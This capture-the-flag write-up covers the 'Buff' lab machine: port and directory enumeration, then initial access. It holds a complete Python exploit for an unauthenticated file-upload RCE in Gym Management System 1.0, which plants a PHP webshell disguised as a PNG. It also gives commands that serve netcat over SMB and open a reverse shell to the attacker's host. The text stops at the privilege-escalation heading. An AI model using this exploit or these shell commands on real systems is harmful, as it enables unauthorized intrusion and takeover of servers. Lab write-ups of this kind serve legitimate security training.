# Buff Writeup
![Buff](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/Buff.png)

**Keyword summary:**

- CloudMe Buffer overflow exploitation.
- RCE Gym Management System

# Enumeration
We will start by performing a scan of the ports that are open on the target IP, using the nmap tool.
This can be done as follows:
```bash
nmap -p- --max-retries --scan-delay -sS --min-rate 5000 -vvv -n -Pn [IP] 
```
Replace '[IP]' with the IP address to be scanned

We will see that the open ports are:

- 7680/tcp tcpwrapped
- 8080/tcp http

now we can do:
```bash
nmap -sCV -p7680,8080 [IP]
```

![Puertos](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/Ports.PNG)


We can then proceed by checking the web page that is hosted on port 8080 of the machine.

![Pagina](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/Captura.PNG)

After reviewing all sections of the website, we have not found anything interesting, except for a message in the "Contacts" section that mentions:

-_"Made with Gym Management Software 1.0."_

However, we will look at this later

For now we are going to use the **WFUZZ** tool to perform a search of the possible directories that are in the target IP address
```bash
wfuzz --hc=404 -w [wordlist path] http://[IP]:8080/FUZZ
```

![Upload](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/Upload%20directory.PNG)

As you can see, something that may interest us is that there is an *"upload"* directory. 
_(We will use this directory later)_

# Foothold
****
Let's go back to the message in the "Contacts" section that mentions:
-_"Made with Gym Management Software 1.0."_
**That is a nice hint!**

Because we can look for possible vulnerabilities reported in this software.
Take a look at this code about Remote Code Execution without Authentication in the "Gym Management System 1.0" software.

**https://www.exploit-db.com/exploits/48506**

The script allows to perform an unauthorized file upload (a .php file). 
Once the php file is uploaded, using the "telepathy" parameter that acts on HTTP requests, remote command execution (RCE) is allowed.

This works because the system doesn't perform a proper validation of the uploaded files. Instead of verifying the type and integrity of the uploaded files, it simply allows any file to be uploaded.


**One thing to note is that the script is in python2.**
**Therefore, it must be run using the python2 command.**
**Or, failing that, use tools like "2to3" to pass it to python3.**
**However, here below you will find the script working in python3 after passing it through "2to3" and making some corrections.**


`(python3 script - Gym Management System 1.0 - Unauthenticated Remote Code Execution)`
```python3
import requests
import sys
import urllib
import re
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def webshell(SERVER_URL, session):
    try:
        WEB_SHELL = SERVER_URL+'upload/kamehameha.php'
        getdir  = {'telepathy': 'echo %CD%'}
        r2 = session.get(WEB_SHELL, params=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            print (Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL)
            r2.raise_for_status()
        print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = cwd[0]+"> "
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        while True:
            thought = raw_input(term)
            command = {'telepathy': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)

def formatHelp(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET


if __name__ == "__main__":
   
    if len(sys.argv) != 2:
        print (formatHelp("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0]))
        print (formatHelp("(+) Example:\t python %s 'https://10.0.0.3:443/gym/'" % sys.argv[0]))
        sys.exit(-1)
    SERVER_URL = sys.argv[1]
    UPLOAD_DIR = 'upload.php?id=kamehameha'
    UPLOAD_URL = SERVER_URL + UPLOAD_DIR
    s = requests.Session()
    s.get(SERVER_URL, verify=False)
    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png     = {
                'file':
                  (
                    'kaio-ken.php.png',
                    PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["telepathy"]); ?>',
                    'image/png',
                    {'Content-Disposition': 'form-data'}
                  )
              }
    fdata   = {'pupload': 'upload'}
    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
    webshell(SERVER_URL, s)
```

Once the above script has been executed we should be able to have a command execution through the browser

![Kamehameha](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/kamehameha.PNG)

Now in order to get the "user flag" we need to get access to the system, one of the possible ways to do this is by getting a "reverse shell". 

This can be accomplished in the following way:
Since the target machine does not have netcat, we are going to provide an smb server whose folder will host a netcat executable.

https://eternallybored.org/misc/netcat/ (Download and unzip netcat for windows in your linux system)

Now, in the folder where the unzipped netcat is located, let's execute the command:
```bash
smbserver.py smbFolder $(pwd) -smb2support
```
![Smbserver](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/smbserver.PNG)

In this way we will go to the search engine and make the following request:
```bash
...?telepathy=dir \\[Our IP]\smbFolder
```
Thus, we will see that the items that are part of the netcat folder will be listed 

![dir smb](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/dir%20smb.PNG)

Now, in our linux environment, we will listen in on port [PORT]
```bash
...nc -lvnp [PORT]
```
So, let's ask for a "reverse shell" by executing the following request in the browser:
```bash
...?telepathy=\\[Our IP]\smbFolder\nc.exe -e cmd [Our IP] [PORT]
```
![reverse_shell](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/reverse_shell.PNG)


The user flag is located at:
```
...cd C:\Users\shaun\Desktop
```
```
...type user.txt
```
```: XXXXXXXXXXXXXXXXXXXXXXX```

# Buffer Overflow Exploitation and Privilege Escalation
